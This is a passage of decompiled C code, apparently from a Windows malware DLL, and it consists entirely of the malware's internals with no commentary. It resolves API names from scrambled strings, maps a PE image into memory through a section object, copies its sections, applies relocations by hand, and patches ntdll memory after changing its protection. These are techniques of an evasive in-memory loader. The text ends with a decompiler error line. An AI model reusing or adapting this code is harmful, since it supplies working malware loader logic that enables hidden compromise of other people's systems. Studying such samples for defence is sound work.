		Scramble_Words(obfw_ntdll_dll, ModuleName);
		return GetModuleHandleW(ModuleName);
	}

	//----- (10001FE9) --------------------------------------------------------
	FARPROC __cdecl GetScrambledProcAddress(WORD * Module, BYTE * Proc)
	{
		HMODULE hModule;
		wchar_t ModuleName[100];
		char ProcName[100];

		Scramble_Words(Module, ModuleName);
		Scramble_Bytes(Proc, ProcName);
		hModule = GetModuleHandleW(ModuleName);
		return GetProcAddress(hModule, ProcName);
	}

	//----- (1000202A) --------------------------------------------------------
	void __cdecl memcpy_wrapper_1(void *Dst, const void *Src, unsigned int Size)
	{
		memcpy(Dst, Src, Size);
	}

	//----- (1000203E) --------------------------------------------------------
	FARPROC __cdecl GetScrambledProcAddressFromKernel32(BYTE * Proc)
	{
		return GetScrambledProcAddress(obfw_kernel32_dll, Proc);
	}

	//----- (1000204F) --------------------------------------------------------
	FARPROC __cdecl GetScrambledProcAddressFromNtdll(BYTE * Proc)
	{
		return GetScrambledProcAddress(obfw_ntdll_dll, Proc);
	}

	//----- (10002060) --------------------------------------------------------
	signed int __cdecl sub_10002060(int a1)
	{
		int v2; // [sp-4h] [bp-9Ch]@3
		int v3; // [sp+0h] [bp-98h]@8
		int v4; // [sp+4h] [bp-94h]@5
		int v5; // [sp+8h] [bp-90h]@11
		int v6; // [sp+Ch] [bp-8Ch]@1
		int v7; // [sp+10h] [bp-88h]@1
		int v8; // [sp+14h] [bp-84h]@1
		unsigned int v9; // [sp+18h] [bp-80h]@1
		int v10; // [sp+1Ch] [bp-7Ch]@1
		int v11; // [sp+20h] [bp-78h]@11
		int v12; // [sp+24h] [bp-74h]@1
		char v13; // [sp+28h] [bp-70h]@5

		v7 = *(_DWORD *)(a1 + 32);
		v8 = (char *)&dword_10001F1A + *(_DWORD *)(a1 + 8) - byte_10001AB9;
		memcpy_wrapper_2(&v9, (const void *)v7, 0x80u);
		v9 = (unsigned int)&v9 ^ 0xAE1979DD;
		v10 = 0;
		v12 = *(_DWORD *)(a1 + 4);
		v6 = sub_100025C7(v8, (int)&v9, *(const void **)(v7 + 140), *(_DWORD *)(v7 + 144));
		if ( v6 )
			return v6;
		v6 = sub_10002529(a1, v8);
		if ( v6 )
			return -4;
		v4 = (*(int (__thiscall **)(int, char *))(v8 + 36))(v2, &v13);
		if ( !v4 )
			return -9;
		*(_DWORD *)(v7 + 128) = v4;
		if ( *(_DWORD *)(v7 + 148) != -1 )
		{
			v3 = (*(int (__thiscall **)(int, _DWORD, signed int, _DWORD, int, _DWORD, _DWORD))(v8 + 52))(
				v4,
				0,
				524288,
				*(_DWORD *)a1,
				a1,
				0,
				0);
			if ( !v3 )
				return -13;
			(*(void (__stdcall **)(int, signed int))(v8 + 56))(v3, -1);
			(*(void (__stdcall **)(int, int *))(v8 + 60))(v3, &v6);
		}
		v5 = v11;
		if ( v11 )
		{
			v11 = 0;
			(*(void (__stdcall **)(int))(v8 + 64))(v5);
		}
		(*(void (__stdcall **)(int))(v8 + 28))(v7);
		return v6;
	}
	// 10001F1A: using guessed type int dword_10001F1A;

	//----- (100021FE) --------------------------------------------------------
	int __stdcall sub_100021FE(int a1)
	{
		int result; // eax@2
		int v2; // [sp+0h] [bp-Ch]@1
		int v3; // [sp+4h] [bp-8h]@1
		unsigned int v4; // [sp+8h] [bp-4h]@1

		v3 = *(_DWORD *)(a1 + 32);
		v4 = (char *)&dword_10001F1A + *(_DWORD *)(a1 + 8) - byte_10001AB9;
		v2 = (*(int (__stdcall **)(_DWORD, _DWORD))(v4 + 20))(*(_DWORD *)(v3 + 128), *(_DWORD *)(v3 + 148));
		if ( v2 )
		{
			((void (__cdecl *)(_DWORD, _DWORD))v2)(*(_DWORD *)(v3 + 132), *(_DWORD *)(v3 + 136));
			result = 0;
		}
		else
		{
			(*(void (__stdcall **)(_DWORD))(v4 + 40))(*(_DWORD *)(v3 + 128));
			result = 0;
		}
		return result;
	}
	// 10001F1A: using guessed type int dword_10001F1A;

	//----- (10002271) --------------------------------------------------------
	int __cdecl sub_10002271(int a1, int a2, int a3)
	{
		int result; // eax@1

		*(_DWORD *)(a1 + 80) = *(_DWORD *)(a2 + 40) + *(_DWORD *)(a2 + 52);
		*(_DWORD *)(a1 + 84) = 0;
		*(_DWORD *)(a1 + 88) = *(_DWORD *)(a2 + 96);
		*(_DWORD *)(a1 + 92) = *(_DWORD *)(a2 + 100);
		*(_DWORD *)(a1 + 96) = *(_WORD *)(a2 + 92);
		*(_WORD *)(a1 + 100) = *(_WORD *)(a2 + 74);
		*(_WORD *)(a1 + 102) = *(_WORD *)(a2 + 72);
		*(_DWORD *)(a1 + 104) = 0;
		*(_WORD *)(a1 + 108) = *(_WORD *)(a2 + 22);
		*(_WORD *)(a1 + 110) = *(_WORD *)(a2 + 94);
		*(_WORD *)(a1 + 112) = *(_WORD *)(a2 + 4);
		*(_BYTE *)(a1 + 114) = 1;
		*(_BYTE *)(a1 + 115) = 4;
		*(_DWORD *)(a1 + 116) = *(_DWORD *)(a2 + 112);
		*(_DWORD *)(a1 + 120) = a3;
		result = a1 + 80;
		*(_DWORD *)(a1 + 124) = 0;
		return result;
	}

	//----- (10002334) --------------------------------------------------------
	signed int __stdcall sub_10002334(int a1)
	{
		signed int result; // eax@3
		int v2; // ST08_4@20
		int v3; // [sp+8h] [bp-24h]@12
		unsigned int v4; // [sp+Ch] [bp-20h]@12
		unsigned int j; // [sp+10h] [bp-1Ch]@14
		int v6; // [sp+18h] [bp-14h]@6
		int v7; // [sp+1Ch] [bp-10h]@6
		int v8; // [sp+24h] [bp-8h]@4
		int i; // [sp+28h] [bp-4h]@10

		if ( a1 && *(_DWORD *)a1 )
		{
			v8 = *(_DWORD *)a1;
			if ( **(_WORD **)a1 == 23117 )
			{
				v6 = *(_DWORD *)(*(_DWORD *)a1 + 60) + v8;
				v7 = v8 - *(_DWORD *)(v6 + 52);
				if ( v8 == *(_DWORD *)(v6 + 52) )
				{
					result = 0;
				}
				else
				{
					*(_DWORD *)(v6 + 52) = v8;
					if ( *(_DWORD *)(v6 + 164) )
					{
						for ( i = *(_DWORD *)(v6 + 160) + v8; *(_DWORD *)(i + 4); i += *(_DWORD *)(i + 4) )
						{
							v4 = *(_DWORD *)(i + 4) - 8;
							v3 = i + 8;
							if ( v4 % 2 )
								return -1073741800;
							for ( j = 0; j < v4 >> 1; ++j )
							{
								if ( (unsigned __int8)(*(_WORD *)v3 >> 8) >> 4 )
								{
									if ( (unsigned __int8)(*(_WORD *)v3 >> 8) >> 4 != 3 )
										return -1073741800;
									v2 = (*(_WORD *)v3 & 0xFFF) + *(_DWORD *)i + v8;
									*(_DWORD *)v2 += v7;
								}
								v3 += 2;
							}
						}
						result = 0;
					}
					else
					{
						result = -1073741800;
					}
				}
			}
			else
			{
				result = -1073741819;
			}
		}
		else
		{
			result = -1073741819;
		}
		return result;
	}

	//----- (10002493) --------------------------------------------------------
	void __cdecl memcpy_wrapper_2(void *Dst, const void *Src, unsigned int Size)
	{
		memcpy(Dst, Src, Size);
	}

	//----- (100024A7) --------------------------------------------------------
	int __cdecl sub_100024A7(const void *a1, int a2, void *a3)
	{
		int result; // eax@2
		int v4; // [sp+0h] [bp-Ch]@1
		int v5; // [sp+4h] [bp-8h]@1
		int v6; // [sp+8h] [bp-4h]@1

		v4 = *(_WORD *)(a2 + 6);
		memcpy_wrapper_2(a3, a1, *(_DWORD *)(a2 + 84));
		v5 = a2 + *(_WORD *)(a2 + 20) + 24;
		v6 = 0;
		while ( 1 )
		{
			result = v6;
			if ( v6 >= v4 )
				break;
			if ( *(_DWORD *)(v5 + 16) )
				memcpy_wrapper_2((char *)a3 + *(_DWORD *)(v5 + 12), (char *)a1 + *(_DWORD *)(v5 + 20), *(_DWORD *)(v5 + 16));
			++v6;
			v5 += 40;
		}
		return result;
	}

	//----- (10002529) --------------------------------------------------------
	signed int __cdecl sub_10002529(int a1, int a2)
	{
		signed int result; // eax@2
		int v3; // [sp+8h] [bp-Ch]@1
		void *v4; // [sp+Ch] [bp-8h]@3
		char v5; // [sp+10h] [bp-4h]@5

		v3 = *(_DWORD *)a2;
		if ( *(_DWORD *)a2 )
		{
			v4 = (void *)(v3 + 64);
			if ( *(_DWORD *)(v3 + 64) == -1421275077 )
			{
				result = 0;
			}
			else
			{
				if ( (*(int (__stdcall **)(int, signed int, signed int, char *))(a2 + 16))(v3, 4096, 128, &v5) )
				{
					memcpy_wrapper_2(v4, *(const void **)(a1 + 24), *(_DWORD *)(a1 + 28));
					(*(void (__thiscall **)(void *))(a1 + 8))(v4);
					(*(void (__stdcall **)(signed int, _DWORD, _DWORD))(a2 + 32))(-1, 0, 0);
					result = 0;
				}
				else
				{
					result = -4;
				}
			}
		}
		else
		{
			result = 0;
		}
		return result;
	}

	//----- (100025C7) --------------------------------------------------------
	signed int __cdecl sub_100025C7(int a1, int a2, const void *a3, int a4)
	{
		signed int result; // eax@2
		int v5; // [sp+0h] [bp-1Ch]@3
		int v6; // [sp+4h] [bp-18h]@5
		int v7; // [sp+8h] [bp-14h]@5
		int v8; // [sp+Ch] [bp-10h]@5
		int v9; // [sp+10h] [bp-Ch]@7
		int v10; // [sp+14h] [bp-8h]@5
		const void *v11; // [sp+18h] [bp-4h]@1

		*(_DWORD *)(a2 + 8) = 0;
		v11 = a3;
		if ( *(_WORD *)a3 == 23117 )
		{
			v5 = (int)((char *)a3 + *((_DWORD *)v11 + 15));
			if ( *(_DWORD *)v5 == 17744 )
			{
				v6 = *(_DWORD *)(v5 + 80);
				v7 = 0;
				v8 = (*(int (__stdcall **)(int *, signed int, _DWORD, int *, signed int, signed int, _DWORD))(a1 + 44))(
					&v10,
					983071,
					0,
					&v6,
					64,
					134217728,
					0);
				if ( v8 )
				{
					result = -11;
				}
				else
				{
					v9 = (*(int (__stdcall **)(int, signed int, _DWORD, _DWORD, _DWORD))(a1 + 24))(v10, 6, 0, 0, 0);
					if ( v9 )
					{
						*(_DWORD *)(a2 + 8) = v10;
						sub_100024A7(a3, v5, (void *)v9);
						sub_10002271(a2, v5, a4);
						(*(void (__stdcall **)(int))(a1 + 28))(v9);
						result = 0;
					}
					else
					{
						(*(void (__stdcall **)(int))(a1 + 64))(v10);
						result = -10;
					}
				}
			}
			else
			{
				result = -2;
			}
		}
		else
		{
			result = -2;
		}
		return result;
	}

	//----- (100026A8) --------------------------------------------------------
	void __cdecl sub_100026A8()
	{
		;
	}

#error "There were 2 decompilation failure(s) on 43 function(s)"
